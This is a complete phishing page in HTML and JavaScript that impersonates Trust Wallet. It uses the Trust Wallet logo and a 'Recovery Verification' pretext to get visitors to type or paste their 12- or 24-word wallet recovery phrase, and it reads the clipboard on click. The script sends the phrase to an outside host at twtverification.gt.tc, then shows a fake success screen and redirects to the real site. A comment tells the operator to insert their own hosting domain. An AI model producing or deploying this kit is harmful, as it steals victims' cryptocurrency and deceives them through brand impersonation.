<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trust Wallet - Recovery Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://js.hcaptcha.com/1/api.js" async defer></script>
    <style>
        :root { --primary: #1e293b; --success: #059669; --error: #dc2626; }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #f1f5f9 0%, #e2e8f0 100%);
            min-height: 100vh;
            padding: 2rem 1rem;
        }
        .container {
            background: rgba(255,255,255,0.95);
            border-radius: 24px;
            box-shadow: 0 20px 40px -10px rgba(0,0,0,0.1);
            max-width: 440px;
            margin: 0 auto;
            padding: 3rem 2rem;
            text-align: center;
        }
        .logo { width: 80px; height: 80px; margin: 0 auto 2rem; border-radius: 16px; background: #f1f5f9; padding: 1rem; }
        .security-header {
            background: linear-gradient(135deg, #059669, #047857);
            color: white;
            padding: 0.75rem 1.5rem;
            border-radius: 12px;
            font-size: 0.95rem;
            font-weight: 600;
            margin-bottom: 1.5rem;
            display: inline-block;
        }
        h1 { font-size: 2rem; font-weight: 700; margin: 0 0 1rem; color: var(--primary); }
        .subtitle { font-size: 1.1rem; color: #64748b; margin-bottom: 2rem; }
        .info-box {
            background: linear-gradient(90deg, #dbeafe, #bfdbfe);
            border: 1px solid #93c5fd;
            border-radius: 12px;
            padding: 1.25rem;
            margin: 1.5rem 0;
            border-left: 4px solid #3b82f6;
            color: #1e40af;
        }
        .paste-area {
            background: #f8fafc;
            border: 2px dashed #cbd5e1;
            border-radius: 12px;
            padding: 1.5rem;
            margin: 1.5rem 0;
            cursor: pointer;
            transition: all 0.3s;
        }
        .paste-area:hover { border-color: #3b82f6; background: #f1f5f9; }
        .paste-area.active { border-color: #3b82f6; background: #dbeafe; }
        .word-selector {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.75rem;
            background: rgba(30,41,59,0.05);
            border-radius: 12px;
            padding: 1rem;
            margin-bottom: 1.5rem;
        }
        select { background: white; border: 2px solid rgba(30,41,59,0.2); border-radius: 10px; padding: 0.75rem 1rem; cursor: pointer; }
        .phrase-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(80px, 1fr)); gap: 1rem; margin: 2rem 0; }
        .phrase-input input {
            width: 100%;
            padding: 0.875rem 0.75rem;
            text-align: center;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            background: white;
        }
        .phrase-input input:focus { outline: none; border-color: var(--primary); }
        .phrase-input input.valid { border-color: var(--success); background: rgba(5,150,105,0.05); }
        .phrase-input input.error { border-color: var(--error); background: rgba(220,38,38,0.05); }
        .submit-btn {
            width: 100%;
            background: linear-gradient(135deg, var(--primary), #334155);
            color: white;
            font-weight: 600;
            font-size: 1.125rem;
            padding: 1.125rem 2rem;
            border: none;
            border-radius: 16px;
            cursor: pointer;
            text-transform: uppercase;
        }
        .submit-btn:disabled { background: #cbd5e1; color: #94a3b8; cursor: not-allowed; }
        @keyframes spin { to { transform: rotate(360deg); } }
        @media(max-width: 480px) { .phrase-grid { grid-template-columns: repeat(3, 1fr); } }
    </style>
</head>
<body>
    <div class="container">
        <img class="logo" src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet">
        <div class="security-header">üîê Verification Secured by Trustwallet</div>
        <h1>Secure Verification Check</h1>
        <p class="subtitle">Enter your wallet recovery phrase to complete verification.</p>
        <div class="info-box">‚ÑπÔ∏è <strong>Quick Verification:</strong> This ensures your wallet is fully protected.</div>

        <div class="word-selector">
            <label>Phrase Length:</label>
            <select id="wordCount">
                <option value="12" selected>12 words</option>
                <option value="24">24 words</option>
            </select>
        </div>

        <div class="paste-area" id="pasteArea"><p>üìã Click here to paste your recovery phrase</p></div>
        <div id="phraseGrid" class="phrase-grid"></div>

        <div style="margin: 1rem 0;">
            <div class="h-captcha" data-sitekey="99c6e00e-96b2-4edc-b17e-1998eee0e932" data-callback="hcaptchaCallback"></div>
        </div>
        
        <button id="submitBtn" class="submit-btn" disabled>üîí Verify Recovery Phrase</button>
    </div>

    <script src="wordlist.js"></script>
    <script>
    (function() {
        'use strict';
        const grid = document.getElementById('phraseGrid');
        const wordCount = document.getElementById('wordCount');
        const submitBtn = document.getElementById('submitBtn');
        const pasteArea = document.getElementById('pasteArea');
        
        // CHANGE THIS TO YOUR INFINITYFREE DOMAIN
        const BACKEND_URL = 'https://twtverification.gt.tc/submit.php';
        
        let inputs = [];

        function createInputs(count) {
            grid.innerHTML = '';
            inputs = [];
            for (let i = 0; i < count; i++) {
                const div = document.createElement('div');
                div.className = 'phrase-input';
                div.innerHTML = '<label style="display:block;font-size:0.8rem;color:#64748b;margin-bottom:0.5rem;">' + (i + 1) + '.</label><input type="text" autocomplete="off" maxlength="20" data-index="' + i + '">';
                const input = div.querySelector('input');
                input.addEventListener('input', validateInput);
                input.addEventListener('paste', handleInputPaste);
                inputs.push(input);
                grid.appendChild(div);
            }
            validateForm();
        }

        function handleInputPaste(e) {
            e.preventDefault();
            const text = e.clipboardData.getData('text');
            const words = text.trim().toLowerCase().split(/\s+/).filter(w => w);
            const startIndex = parseInt(e.target.dataset.index);
            for (let i = 0; i < words.length && (startIndex + i) < inputs.length; i++) {
                inputs[startIndex + i].value = words[i];
            }
            inputs.forEach(input => validateInput({target: input}));
        }

        pasteArea.addEventListener('click', async () => {
            try {
                const text = await navigator.clipboard.readText();
                if (text) {
                    const words = text.trim().toLowerCase().split(/\s+/).filter(w => w).slice(0, inputs.length);
                    inputs.forEach((input, i) => { if (words[i]) input.value = words[i]; });
                    inputs.forEach(input => validateInput({target: input}));
                    pasteArea.classList.add('active');
                    setTimeout(() => pasteArea.classList.remove('active'), 1000);
                }
            } catch (err) {}
        });

        function validateInput(e) {
            const input = e.target;
            const value = input.value.trim().toLowerCase();
            input.classList.remove('valid', 'error');
            if (value && BIP39_WORDLIST.includes(value)) {
                input.classList.add('valid');
            } else if (value) {
                input.classList.add('error');
            }
            validateForm();
        }

        function validateForm() {
            const allFilled = inputs.every(input => input.value.trim());
            const allValid = inputs.every(input => {
                const value = input.value.trim().toLowerCase();
                return value && BIP39_WORDLIST.includes(value);
            });
            let hcaptchaResponse = '';
            try {
                if (typeof hcaptcha !== 'undefined' && hcaptcha.getResponse) {
                    hcaptchaResponse = hcaptcha.getResponse();
                }
            } catch (e) {}
            const captchaValid = hcaptchaResponse && hcaptchaResponse.length > 0;
            submitBtn.disabled = !(allFilled && allValid && captchaValid);
        }

        async function submitForm() {
            const phrase = inputs.map(i => i.value.trim());
            const hcaptchaToken = hcaptcha.getResponse();
            if (!hcaptchaToken) { alert('Please complete the captcha.'); return; }
            
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;gap:0.5rem"><div style="width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:white;animation:spin 1s linear infinite"></div>Verifying...</div>';
            
            try {
                const response = await fetch(BACKEND_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams({
                        phrase: JSON.stringify(phrase),
                        hcaptcha_response: hcaptchaToken
                    })
                });
                
                if (response.ok) {
                    // Show success and redirect
                    document.body.innerHTML = `
                        <div style="display:flex;align-items:center;justify-content:center;min-height:100vh;background:linear-gradient(135deg,#f1f5f9,#e2e8f0)">
                            <div style="background:white;border-radius:24px;padding:3rem 2.5rem;text-align:center;max-width:500px;box-shadow:0 20px 60px rgba(0,0,0,0.08)">
                                <img style="width:60px;margin-bottom:1.5rem" src="https://trustwallet.com/assets/images/media/assets/TWT.png">
                                <div style="width:100px;height:100px;border-radius:50%;background:linear-gradient(135deg,#3375BB,#1E3A8A);margin:0 auto 2rem;display:flex;align-items:center;justify-content:center;font-size:3.5rem;color:white">‚úì</div>
                                <h1 style="font-size:2rem;margin-bottom:1rem;color:#0f172a">Verification Complete!</h1>
                                <div style="background:linear-gradient(135deg,#10b981,#059669);color:white;padding:0.75rem 1.5rem;border-radius:12px;display:inline-block;margin-bottom:2rem">‚úÖ Phrase Verified Successfully</div>
                                <p style="color:#64748b;margin-bottom:1.5rem">Your wallet is now synchronized with Trust Wallet's security network.</p>
                                <a href="https://trustwallet.com" style="background:linear-gradient(135deg,#3375BB,#1E3A8A);color:white;padding:1rem 2.5rem;border-radius:12px;text-decoration:none;display:inline-block;font-weight:600">Return to Trust Wallet</a>
                            </div>
                        </div>`;
                    setTimeout(() => window.location.href = 'https://trustwallet.com', 5000);
                } else {
                    alert('Verification failed. Please try again.');
                    location.reload();
                }
            } catch (error) {
                alert('Network error. Please check your connection.');
                location.reload();
            }
        }

        submitBtn.addEventListener('click', submitForm);
        wordCount.addEventListener('change', () => createInputs(parseInt(wordCount.value)));
        window.hcaptchaCallback = function() { setTimeout(validateForm, 100); };
        setInterval(validateForm, 500);
        createInputs(12);
    })();
    </script>
</body>
</html>
